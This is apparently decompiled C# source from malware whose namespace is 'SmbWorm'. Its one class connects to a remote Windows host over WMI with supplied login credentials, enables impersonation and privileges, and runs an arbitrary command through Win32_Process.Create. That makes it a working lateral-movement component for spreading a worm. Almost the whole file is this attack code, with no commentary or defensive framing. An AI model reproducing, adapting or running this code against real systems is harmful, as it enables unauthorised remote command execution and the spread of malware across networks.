using System.Management;

namespace SmbWorm;

internal class WimExcuter
{
	public static string Run(string host, string commandline, WimAccount account)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		//IL_0077: Expected O, but got Unknown
		//IL_0077: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		ConnectionOptions val = new ConnectionOptions();
		if (!string.IsNullOrEmpty(account.Password))
		{
			val.Password = account.Password;
		}
		if (!string.IsNullOrEmpty(account.Login))
		{
			val.Username = account.Login;
		}
		val.Impersonation = (ImpersonationLevel)3;
		val.EnablePrivileges = true;
		ManagementScope val2 = new ManagementScope($"\\\\{host}\\ROOT\\CIMV2", val);
		val2.Connect();
		ManagementClass val3 = new ManagementClass(val2, new ManagementPath("Win32_Process"), new ObjectGetOptions());
		ManagementBaseObject methodParameters = ((ManagementObject)val3).GetMethodParameters("Create");
		methodParameters["CommandLine"] = "cmd /k " + commandline;
		return ((ManagementObject)val3).InvokeMethod("Create", methodParameters, (InvokeMethodOptions)null)["returnValue"] as string;
	}
}
